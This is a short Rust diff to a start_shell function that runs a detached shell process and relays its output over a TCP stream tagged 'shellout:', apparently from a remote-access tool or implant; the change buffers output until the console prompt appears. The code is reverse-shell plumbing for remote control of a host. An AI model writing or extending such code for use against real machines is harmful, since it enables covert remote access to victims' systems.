@@ -4,7 +4,7 @@ use std::process::Child;
 use std::net::TcpStream;
 use std::sync::{Arc, Mutex};
 
-use crate::handler::{read_buffer, write_bytes};
+use common::buffers::{read_console_buffer, write_bytes};
 
 pub fn start_shell(write_stream: Arc<Mutex<TcpStream>>, remote_shell: &mut Option<Child>) {
     const DETACH: u32 = 0x00000008;
@@ -22,14 +22,19 @@ pub fn start_shell(write_stream: Arc<Mutex<TcpStream>>, remote_shell: &mut Optio
             if let Some(stdout) = shell.stdout.take() {
                 std::thread::spawn(move || {
                     let mut cmd_output = stdout;
-                    
+                    let mut cmd_buffer: String = String::new();
                     loop {
-                        let read_result = read_buffer(&mut cmd_output);
+                        let read_result = read_console_buffer(&mut cmd_output);
                         match read_result {
                             Ok(vec) => {
-                                let output_str = String::from("shellout:") + &String::from_utf8_lossy(&vec);
-                                let mut ws_lock = write_stream.lock().unwrap();
-                                write_bytes(&mut ws_lock, output_str.as_bytes());
+                                cmd_buffer += &String::from_utf8_lossy(&vec);
+
+                                if String::from_utf8_lossy(&vec).ends_with('>') {
+                                    cmd_buffer = String::from("shellout:") + &cmd_buffer;
+                                    let mut ws_lock = write_stream.lock().unwrap();
+                                    write_bytes(&mut ws_lock, cmd_buffer.as_bytes());
+                                    cmd_buffer.clear();
+                                }
                             },
                             Err(_) => {
                                 eprintln!("Error reading from shell stdout or end of file.");
